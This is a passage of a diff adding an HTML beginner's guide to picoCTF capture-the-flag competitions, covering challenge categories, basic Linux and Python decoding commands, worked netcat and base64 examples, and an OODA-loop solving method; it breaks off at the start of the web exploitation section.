@@ -1,0 +1,2516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete CTF Strategy Guide for picoCTF</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        /* --- CSS Styles --- */
+        :root {
+            --header-bg: #1a1a2e;
+            --header-text: #ffffff;
+            --accent-blue: #3498db;
+            --accent-purple: #9b59b6;
+            --accent-green: #27ae60;
+            --accent-orange: #e67e22;
+            --accent-red: #e74c3c;
+            --bg-main: #f4f7f6;
+            --bg-card: #ffffff;
+            --bg-dark: #16213e;
+            --text-dark: #333333;
+            --text-light: #666666;
+            --border-color: #e0e0e0;
+            --code-bg: #f8f9fa;
+            --code-text: #e83e8c;
+            /* Warning/Success Colors */
+            --warning-bg: #fff3cd;
+            --warning-border: #ffeeba;
+            --warning-text: #856404;
+            --success-bg: #d4edda;
+            --success-border: #c3e6cb;
+            --success-text: #155724;
+            --info-bg: #d1ecf1;
+            --info-border: #bee5eb;
+            --info-text: #0c5460;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-main);
+            color: var(--text-dark);
+            line-height: 1.7;
+        }
+
+        /* Header */
+        header {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: var(--header-text);
+            padding: 2.5rem 2rem;
+            text-align: center;
+            border-bottom: 4px solid var(--accent-blue);
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239C92AC' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            opacity: 0.5;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            z-index: 1;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        header p {
+            margin: 0.75rem 0 0;
+            opacity: 0.9;
+            font-size: 1.1rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.1);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            margin-top: 1rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Navigation */
+        .nav-container {
+            background-color: var(--bg-card);
+            padding: 0.75rem 2rem;
+            border-bottom: 1px solid var(--border-color);
+            overflow-x: auto;
+            white-space: nowrap;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-tabs {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: inline-flex;
+            gap: 0.5rem;
+        }
+
+        .nav-tab {
+            padding: 0.6rem 1.2rem;
+            cursor: pointer;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: var(--text-light);
+            transition: all 0.2s ease;
+            border: 1px solid transparent;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .nav-tab:hover {
+            background-color: var(--bg-main);
+            color: var(--accent-blue);
+            transform: translateY(-1px);
+        }
+
+        .nav-tab.active {
+            background: linear-gradient(135deg, var(--accent-blue) 0%, #2980b9 100%);
+            color: white;
+            box-shadow: 0 2px 8px rgba(52, 152, 219, 0.3);
+        }
+
+        /* Main Content Area */
+        main {
+            max-width: 1300px;
+            margin: 2rem auto;
+            padding: 0 2rem;
+        }
+
+        /* Tab Content Management */
+        .tab-content {
+            display: none;
+            background-color: var(--bg-card);
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border: 1px solid var(--border-color);
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Content Typography & Elements */
+        h2 {
+            color: var(--header-bg);
+            border-bottom: 3px solid var(--accent-blue);
+            padding-bottom: 0.75rem;
+            margin-top: 2.5rem;
+            font-weight: 700;
+            font-size: 1.75rem;
+        }
+        h2:first-child { margin-top: 0; }
+
+        h3 { 
+            color: var(--accent-blue); 
+            margin-bottom: 0.75rem;
+            margin-top: 2rem;
+            font-weight: 600;
+            font-size: 1.3rem;
+        }
+
+        h4 {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        ul { padding-left: 1.5rem; }
+        li { margin-bottom: 0.5rem; }
+
+        a {
+            color: var(--accent-blue);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: #2980b9;
+            text-decoration: underline;
+        }
+
+        code {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+            font-size: 0.85em;
+            border: 1px solid #e9ecef;
+        }
+
+        /* Category Grid */
+        .category-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .category-card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .category-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: var(--accent-blue);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .category-card:hover { 
+            transform: translateY(-5px); 
+            box-shadow: 0 8px 25px rgba(0,0,0,0.12);
+            border-color: var(--accent-blue);
+        }
+
+        .category-card:hover::before {
+            opacity: 1;
+        }
+
+        .category-card h4 { 
+            color: var(--accent-blue); 
+            margin-top: 0; 
+            font-size: 1.1rem;
+        }
+
+        .category-card p { 
+            font-size: 0.9rem; 
+            color: var(--text-light); 
+            margin-bottom: 0; 
+            line-height: 1.6;
+        }
+
+        /* Special Boxes (Warning / Success / Info) */
+        .alert-box {
+            padding: 1.5rem;
+            border-radius: 10px;
+            margin: 2rem 0;
+            border-left: 4px solid;
+        }
+
+        .alert-warning {
+            background-color: var(--warning-bg);
+            border-color: #f0ad4e;
+            color: var(--warning-text);
+        }
+
+        .alert-success {
+            background-color: var(--success-bg);
+            border-color: #5cb85c;
+            color: var(--success-text);
+        }
+
+        .alert-info {
+            background-color: var(--info-bg);
+            border-color: #5bc0de;
+            color: var(--info-text);
+        }
+
+        .alert-title {
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+            font-size: 1.15rem;
+        }
+
+        /* Footer */
+        footer {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #b8c5d6;
+            padding: 3rem 2rem;
+            margin-top: 3rem;
+            text-align: center;
+        }
+
+        footer h3 {
+            color: white;
+            margin-top: 0;
+        }
+
+        footer a {
+            color: var(--accent-blue);
+        }
+
+        footer a:hover {
+            color: #5dade2;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+            margin: 1.5rem 0;
+        }
+
+        .footer-links a {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 0.5rem 1rem;
+            background: rgba(255,255,255,0.05);
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        .footer-links a:hover {
+            background: rgba(255,255,255,0.1);
+            text-decoration: none;
+            transform: translateY(-2px);
+        }
+
+        .footer-copyright {
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 1.5rem;
+            }
+            
+            .tab-content {
+                padding: 1.5rem;
+            }
+
+            .nav-tab {
+                padding: 0.5rem 0.8rem;
+                font-size: 0.8rem;
+            }
+
+            main {
+                padding: 0 1rem;
+            }
+        }
+
+        /* Print styles */
+        @media print {
+            .nav-container, footer {
+                display: none;
+            }
+            
+            .tab-content {
+                display: block !important;
+                break-inside: avoid;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>CTF Strategy Guide</h1>
+        <p>A comprehensive resource for Capture The Flag competitions</p>
+        <div class="header-badge">
+            Stuyvesant Cybersecurity Club
+        </div>
+    </header>
+
+    <div class="nav-container">
+        <ul class="nav-tabs">
+            <li class="nav-tab active" data-target="tab-mindset">Overview</li>
+            <li class="nav-tab" data-target="tab-methodology">Methodology</li>
+            <li class="nav-tab" data-target="tab-web">Web</li>
+            <li class="nav-tab" data-target="tab-crypto">Cryptography</li>
+            <li class="nav-tab" data-target="tab-forensics">Forensics</li>
+            <li class="nav-tab" data-target="tab-bin-exp">Binary Exploitation</li>
+            <li class="nav-tab" data-target="tab-rev-eng">Reverse Engineering</li>
+            <li class="nav-tab" data-target="tab-essential">Tools</li>
+        </ul>
+    </div>
+
+
+    <main>
+
+        <section id="tab-mindset" class="tab-content active">
+            <h2>Understanding CTF Competitions</h2>
+
+            <h3>What is a CTF?</h3>
+            <p>Capture The Flag (CTF) competitions are cybersecurity challenges where participants solve puzzles to find hidden "flags" — special text strings (like <code>picoCTF{example_flag_here}</code>) that prove completion of a task. These competitions gamify learning by simulating real-world security scenarios in controlled environments.</p>
+
+            <div style="background: #f8f9fa; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; border-left: 4px solid #3498db;">
+                <h4 style="color: #3498db; margin-top: 0;">Why Compete in CTFs?</h4>
+                <ul style="margin-bottom: 0;">
+                    <li><strong>Learn by Doing:</strong> Hands-on experience with real security concepts</li>
+                    <li><strong>Build Your Resume:</strong> Demonstrate practical skills to employers</li>
+                    <li><strong>Join a Community:</strong> Connect with like-minded security enthusiasts</li>
+                    <li><strong>Have Fun:</strong> Gamified learning makes security exciting!</li>
+                </ul>
+            </div>
+
+            <h3>Types of CTF Competitions</h3>
+            <ul>
+                <li><strong>Jeopardy-Style CTFs (picoCTF):</strong> Independent challenges across categories (web, crypto, forensics, etc.). Solve challenges in any order to earn points.</li>
+                <li><strong>Attack-Defense:</strong> Teams defend their own servers while attacking opponents' systems.</li>
+                <li><strong>King of the Hill:</strong> Maintain control of vulnerable machines longer than competitors.</li>
+                <li><strong>Mixed Format:</strong> Combinations of the above styles.</li>
+            </ul>
+
+            <h3>Common CTF Categories</h3>
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #3498db;">
+                    <h4>Web Exploitation</h4>
+                    <p>SQL injection, XSS, CSRF, authentication bypass, API vulnerabilities</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #9b59b6;">
+                    <h4>Cryptography</h4>
+                    <p>Classical ciphers, RSA, AES, hash functions, encoding schemes</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #27ae60;">
+                    <h4>Forensics</h4>
+                    <p>File analysis, metadata extraction, disk images, memory dumps</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #16a085;">
+                    <h4>Steganography</h4>
+                    <p>Hidden data in images, audio, video files</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #e74c3c;">
+                    <h4>Binary Exploitation</h4>
+                    <p>Buffer overflows, ROP chains, format strings, shellcode</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #e67e22;">
+                    <h4>Reverse Engineering</h4>
+                    <p>Disassembly, decompilation, analyzing binaries and firmware</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #1abc9c;">
+                    <h4>General Skills</h4>
+                    <p>Linux commands, networking basics, scripting, problem-solving</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #34495e;">
+                    <h4>OSINT</h4>
+                    <p>Open-source intelligence gathering from public sources</p>
+                </div>
+            </div>
+
+            <!-- Quick Start Examples for Beginners -->
+            <h2>🚀 Quick Start: Your First CTF Commands</h2>
+            <p>These are the most common commands you'll use in picoCTF. Master these first!</p>
+
+            <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0;">
+                <h3 style="color: #1abc9c; margin-top: 0;">Essential Linux Commands for CTF</h3>
+                <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; font-family: monospace; font-size: 0.9rem;">
+                    <p style="color: #7ee787; margin-bottom: 0.5rem;"># Navigate and explore</p>
+                    <p style="color: #f0f6fc;">cd /path/to/folder      # Change directory</p>
+                    <p style="color: #f0f6fc;">ls -la                  # List all files with details</p>
+                    <p style="color: #f0f6fc;">cat file.txt            # Display file contents</p>
+                    <br>
+                    <p style="color: #7ee787; margin-bottom: 0.5rem;"># Search for flags</p>
+                    <p style="color: #f0f6fc;">grep -r "picoCTF" .     # Search recursively for flag</p>
+                    <p style="color: #f0f6fc;">grep -i "flag" file.txt # Case-insensitive search</p>
+                    <br>
+                    <p style="color: #7ee787; margin-bottom: 0.5rem;"># File analysis</p>
+                    <p style="color: #f0f6fc;">file mystery_file       # Identify file type</p>
+                    <p style="color: #f0f6fc;">strings binary | less   # Extract readable text</p>
+                    <br>
+                    <p style="color: #7ee787; margin-bottom: 0.5rem;"># Download files</p>
+                    <p style="color: #f0f6fc;">wget http://url/file    # Download a file</p>
+                    <p style="color: #f0f6fc;">curl http://url         # Fetch URL content</p>
+                    <br>
+                    <p style="color: #7ee787; margin-bottom: 0.5rem;"># Connect to remote servers</p>
+                    <p style="color: #f0f6fc;">nc challenge.com 1337   # Connect via netcat</p>
+                    <p style="color: #f0f6fc;">ssh user@server.com     # SSH connection</p>
+                </div>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0;">
+                <h3 style="color: #3498db; margin-top: 0;">🐍 Python One-Liners for CTF</h3>
+                <p style="color: #b8c5d6;">Python is incredibly useful for CTF. Here are common patterns:</p>
+                <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; font-family: monospace; font-size: 0.85rem;">
+                    <p style="color: #7ee787;"># Decode Base64</p>
+                    <p style="color: #f0f6fc;">python3 -c "import base64; print(base64.b64decode('cGljb0NURg==').decode())"</p>
+                    <br>
+                    <p style="color: #7ee787;"># Decode Hex to ASCII</p>
+                    <p style="color: #f0f6fc;">python3 -c "print(bytes.fromhex('7069636f435446').decode())"</p>
+                    <br>
+                    <p style="color: #7ee787;"># Convert decimal ASCII to text</p>
+                    <p style="color: #f0f6fc;">python3 -c "print(''.join(chr(x) for x in [112,105,99,111,67,84,70]))"</p>
+                    <br>
+                    <p style="color: #7ee787;"># XOR two strings</p>
+                    <p style="color: #f0f6fc;">python3 -c "print(''.join(chr(ord(a)^ord(b)) for a,b in zip('secret','KEYKEY')))"</p>
+                    <br>
+                    <p style="color: #7ee787;"># Brute force single-byte XOR</p>
+                    <p style="color: #f0f6fc;">python3 -c "cipher=bytes.fromhex('...'); [print(f'{k}: {bytes([b^k for b in cipher])}') for k in range(256)]"</p>
+                </div>
+            </div>
+
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #27ae60; background: linear-gradient(135deg, #1a3d2e 0%, #1a1a2e 100%);">
+                    <h4 style="color: #27ae60;"> Worked Example: General Skills</h4>
+                    <p style="color: #b8c5d6;"><strong>Challenge:</strong> "Connect to the server at saturn.picoctf.net on port 52279 to get the flag."</p>
+                    <div style="background: #0d1117; padding: 0.75rem; border-radius: 4px; margin-top: 0.5rem; font-family: monospace; font-size: 0.85rem;">
+                        <p style="color: #f0f6fc; margin: 0;">$ nc saturn.picoctf.net 52279</p>
+                        <p style="color: #888; margin: 0;">picoCTF{n3tc4t_1s_y0ur_fr13nd}</p>
+                    </div>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #9b59b6; background: linear-gradient(135deg, #2d1a4e 0%, #1a1a2e 100%);">
+                    <h4 style="color: #9b59b6;"> Worked Example: Encoding</h4>
+                    <p style="color: #b8c5d6;"><strong>Challenge:</strong> Decode: <code>cGljb0NURntub3RfYmFkfQ==</code></p>
+                    <div style="background: #0d1117; padding: 0.75rem; border-radius: 4px; margin-top: 0.5rem; font-family: monospace; font-size: 0.85rem;">
+                        <p style="color: #f0f6fc; margin: 0;">$ echo "cGljb0NURntub3RfYmFkfQ==" | base64 -d</p>
+                        <p style="color: #888; margin: 0;">picoCTF{not_bad}</p>
+                    </div>
+                </div>
+            </div>
+
+            <h2>The CTF Mindset</h2>
+
+            <h3>Core Mental Approaches</h3>
+            <ul>
+                <li><strong>Systematic Thinking:</strong> Break down complex challenges into smaller, manageable pieces</li>
+                <li><strong>Pattern Recognition:</strong> Identify common vulnerability patterns across challenges</li>
+                <li><strong>Persistence Over Perfection:</strong> Getting stuck is normal; take breaks and return with fresh eyes</li>
+                <li><strong>Learn from Failure:</strong> Every failed attempt teaches something valuable</li>
+                <li><strong>Creative Problem-Solving:</strong> Think outside conventional approaches</li>
+                <li><strong>Documentation Habit:</strong> Take detailed notes of everything you try</li>
+            </ul>
+
+            <div class="alert-box alert-warning">
+                <div class="alert-title">Common Beginner Pitfalls</div>
+                <ul>
+                    <li><strong>Overconfidence:</strong> Don't assume challenges are easier than they appear</li>
+                    <li><strong>Tunnel Vision:</strong> If stuck for 30+ minutes, switch to a different challenge</li>
+                    <li><strong>Skipping Basics:</strong> Always check simple solutions first (view source, strings command, basic encoding)</li>
+                    <li><strong>Not Reading Carefully:</strong> Challenge descriptions often contain crucial hints</li>
+                    <li><strong>Ignoring File Extensions:</strong> Always verify actual file types with <code>file</code> command</li>
+                    <li><strong>Working in Isolation:</strong> Collaborate, ask questions, and learn from the community</li>
+                </ul>
+            </div>
+
+            <div class="alert-box alert-success">
+                <div class="alert-title">Keys to Success</div>
+                <ol>
+                    <li><strong>Start Small:</strong> Begin with beginner-level platforms like picoCTF's picoGym</li>
+                    <li><strong>Practice Consistently:</strong> 30-60 minutes daily beats weekend marathons</li>
+                    <li><strong>Build Fundamentals:</strong> Master Linux, networking, and basic programming first</li>
+                    <li><strong>Use Write-ups Wisely:</strong> Only after genuine attempts; focus on understanding methodology</li>
+                    <li><strong>Create Your Own Write-ups:</strong> Teaching reinforces learning</li>
+                    <li><strong>Join Communities:</strong> Discord servers, forums, and team collaboration accelerate learning</li>
+                    <li><strong>Embrace the Struggle:</strong> Difficulty means you're learning; celebrate small victories</li>
+                </ol>
+            </div>
+        </section>
+
+        <section id="tab-methodology" class="tab-content">
+            <h2>Core Methodology: The OODA Loop</h2>
+            <p>The OODA Loop (Observe, Orient, Decide, Act) is a decision-making framework developed by military strategist John Boyd. In CTF competitions, this methodology provides a systematic approach to solving challenges efficiently.</p>
+
+            <div class="methodology-diagram" style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; text-align: center;">
+                <svg viewBox="0 0 500 200" style="max-width: 100%; height: auto;">
+                    <!-- Observe Box -->
+                    <rect x="10" y="70" width="100" height="60" rx="8" fill="#3498db" opacity="0.9"/>
+                    <text x="60" y="95" text-anchor="middle" fill="white" font-weight="bold" font-size="12">OBSERVE</text>
+                    <text x="60" y="115" text-anchor="middle" fill="white" font-size="9">Reconnaissance</text>
+                    
+                    <!-- Arrow 1 -->
+                    <path d="M 115 100 L 135 100" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrow)"/>
+                    
+                    <!-- Orient Box -->
+                    <rect x="140" y="70" width="100" height="60" rx="8" fill="#9b59b6" opacity="0.9"/>
+                    <text x="190" y="95" text-anchor="middle" fill="white" font-weight="bold" font-size="12">ORIENT</text>
+                    <text x="190" y="115" text-anchor="middle" fill="white" font-size="9">Enumeration</text>
+                    
+                    <!-- Arrow 2 -->
+                    <path d="M 245 100 L 265 100" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrow)"/>
+                    
+                    <!-- Decide Box -->
+                    <rect x="270" y="70" width="100" height="60" rx="8" fill="#e67e22" opacity="0.9"/>
+                    <text x="320" y="95" text-anchor="middle" fill="white" font-weight="bold" font-size="12">DECIDE</text>
+                    <text x="320" y="115" text-anchor="middle" fill="white" font-size="9">Analysis</text>
+                    
+                    <!-- Arrow 3 -->
+                    <path d="M 375 100 L 395 100" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrow)"/>
+                    
+                    <!-- Act Box -->
+                    <rect x="400" y="70" width="90" height="60" rx="8" fill="#27ae60" opacity="0.9"/>
+                    <text x="445" y="95" text-anchor="middle" fill="white" font-weight="bold" font-size="12">ACT</text>
+                    <text x="445" y="115" text-anchor="middle" fill="white" font-size="9">Exploit</text>
+                    
+                    <!-- Loop Back Arrow -->
+                    <path d="M 445 135 Q 445 170 250 170 Q 60 170 60 135" stroke="#e74c3c" stroke-width="2" fill="none" stroke-dasharray="5,3"/>
+                    <text x="250" y="190" text-anchor="middle" fill="#e74c3c" font-size="10">Iterate & Refine</text>
+                    
+                    <!-- Arrow Marker Definition -->
+                    <defs>
+                        <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
+                            <path d="M0,0 L0,6 L9,3 z" fill="#ecf0f1"/>
+                        </marker>
+                    </defs>
+                </svg>
+            </div>
+
+            <h3>Phase 1: Observe (Reconnaissance)</h3>
+            <p>The first phase involves gathering as much information as possible about the challenge without actively interacting with it. This is your "big picture" view.</p>
+            
+            <div class="category-grid">
+                <div class="category-card">
+                    <h4>Read Everything</h4>
+                    <p>Challenge title, description, hints, and point values often contain crucial clues about the intended solution path.</p>
+                </div>
+                <div class="category-card">
+                    <h4>Examine Files</h4>
+                    <p>Download all provided files. Note file types, sizes, names, and any patterns. Use <code>file</code> command to verify actual types.</p>
+                </div>
+                <div class="category-card">
+                    <h4>Identify Resources</h4>
+                    <p>Note all URLs, IP addresses, ports, and any external resources mentioned or provided.</p>
+                </div>
+                <div class="category-card">
+                    <h4>Categorize</h4>
+                    <p>Determine the challenge category (web, crypto, forensics, etc.) to focus your approach and tool selection.</p>
+                </div>
+            </div>
+
+            <div class="alert-box alert-success">
+                <div class="alert-title">The 5-Minute Rule</div>
+                <p>Spend the first 5 minutes ONLY reading and observing. Don't touch any tools yet. Often, challenges have obvious hints in the description that save hours of work.</p>
+            </div>
+
+            <h3>Phase 2: Orient (Enumeration)</h3>
+            <p>Now actively interact with the challenge to gather detailed information. This phase involves systematic exploration and data collection.</p>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                <div style="background: #1a1a2e; border-left: 4px solid #3498db; padding: 1.5rem; border-radius: 0 8px 8px 0;">
+                    <h4 style="color: #3498db; margin-top: 0;">Web Challenges</h4>
+                    <ul style="color: #b8c5d6;">
+                        <li>View page source (Ctrl+U)</li>
+                        <li>Check robots.txt and sitemap.xml</li>
+                        <li>Inspect cookies and local storage</li>
+                        <li>Analyze network requests (DevTools)</li>
+                        <li>Directory brute-forcing (gobuster/dirbuster)</li>
+                        <li>Check for common files (.git, .env, backup files)</li>
+                    </ul>
+                </div>
+                <div style="background: #1a1a2e; border-left: 4px solid #9b59b6; padding: 1.5rem; border-radius: 0 8px 8px 0;">
+                    <h4 style="color: #9b59b6; margin-top: 0;">Crypto Challenges</h4>
+                    <ul style="color: #b8c5d6;">
+                        <li>Identify encoding type (Base64, hex, etc.)</li>
+                        <li>Look for patterns in ciphertext</li>
+                        <li>Check for known cipher characteristics</li>
+                        <li>Analyze key sizes and formats</li>
+                        <li>Look for weaknesses in implementation</li>
+                    </ul>
+                </div>
+                <div style="background: #1a1a2e; border-left: 4px solid #e67e22; padding: 1.5rem; border-radius: 0 8px 8px 0;">
+                    <h4 style="color: #e67e22; margin-top: 0;">Forensics Challenges</h4>
+                    <ul style="color: #b8c5d6;">
+                        <li>Run <code>file</code> command on all files</li>
+                        <li>Extract metadata with <code>exiftool</code></li>
+                        <li>Run <code>strings</code> on binary files</li>
+                        <li>Use <code>binwalk</code> for embedded files</li>
+                        <li>Check for steganography</li>
+                    </ul>
+                </div>
+                <div style="background: #1a1a2e; border-left: 4px solid #27ae60; padding: 1.5rem; border-radius: 0 8px 8px 0;">
+                    <h4 style="color: #27ae60; margin-top: 0;">Binary / RE Challenges</h4>
+                    <ul style="color: #b8c5d6;">
+                        <li>Identify file type and architecture</li>
+                        <li>Check protections (checksec)</li>
+                        <li>Run the binary in a sandbox</li>
+                        <li>Disassemble main functions</li>
+                        <li>Look for interesting strings</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Phase 3: Decide (Analysis & Strategy)</h3>
+            <p>Analyze your findings and develop an attack strategy. This is where critical thinking separates good CTF players from great ones.</p>
+
+            <table style="width: 100%; border-collapse: collapse; margin: 1.5rem 0;">
+                <thead>
+                    <tr style="background: var(--header-bg); color: white;">
+                        <th style="padding: 1rem; text-align: left; border: 1px solid var(--border-color);">Question</th>
+                        <th style="padding: 1rem; text-align: left; border: 1px solid var(--border-color);">Why It Matters</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">What vulnerabilities did I find?</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Prioritize the most promising attack vectors</td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">What's the easiest path to the flag?</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">CTFs reward speed; don't over-engineer solutions</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Have I seen this pattern before?</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Many challenges use common vulnerability types</td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">What tools do I need?</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Prepare your toolkit before exploiting</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">What could go wrong?</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Anticipate obstacles and have backup plans</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Phase 4: Act (Exploitation)</h3>
+            <p>Execute your attack plan methodically. Document everything as you go!</p>
+
+            <div class="alert-box alert-warning">
+                <div class="alert-title">Document Your Steps</div>
+                <p>Always keep detailed notes of every command you run and every result you get. This helps you:</p>
+                <ul>
+                    <li>Avoid repeating failed attempts</li>
+                    <li>Write quality write-ups after the competition</li>
+                    <li>Debug when something goes wrong</li>
+                    <li>Learn from your process for future challenges</li>
+                </ul>
+            </div>
+
+            <h3>The Iteration Principle</h3>
+            <p>The OODA loop is meant to be repeated. If your first approach fails:</p>
+            <ol>
+                <li><strong>Don't panic</strong> — failure is information</li>
+                <li><strong>Return to Observe</strong> — what did you miss?</li>
+                <li><strong>Re-Orient</strong> — gather more data with new focus</li>
+                <li><strong>Decide again</strong> — adjust your strategy</li>
+                <li><strong>Act differently</strong> — try a new approach</li>
+            </ol>
+
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c;">Common Mistakes</h4>
+                    <ul style="font-size: 0.9rem;">
+                        <li>Jumping straight to exploitation</li>
+                        <li>Not reading the challenge description</li>
+                        <li>Over-complicating the solution</li>
+                        <li>Ignoring obvious hints</li>
+                        <li>Not taking breaks when stuck</li>
+                    </ul>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60;">Best Practices</h4>
+                    <ul style="font-size: 0.9rem;">
+                        <li>Start with low-hanging fruit</li>
+                        <li>Take detailed notes</li>
+                        <li>Time-box difficult challenges</li>
+                        <li>Ask teammates for fresh perspectives</li>
+                        <li>Learn from every attempt</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="tab-web" class="tab-content">
+            <h2>Web Exploitation</h2>
+            <p>Web exploitation is one of the most common CTF categories, focusing on vulnerabilities in web applications. Understanding these concepts is essential for both CTF success and real-world security.</p>
+
+            <!-- Web Attack Flow Diagram -->
+            <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; text-align: center;">
+                <h4 style="color: #3498db; margin-top: 0;">Web Attack Methodology Flow</h4>
+                <svg viewBox="0 0 700 120" style="max-width: 100%; height: auto;">
+                    <!-- Step 1 -->
+                    <rect x="5" y="30" width="100" height="60" rx="8" fill="#3498db"/>
+                    <text x="55" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="11">RECON</text>
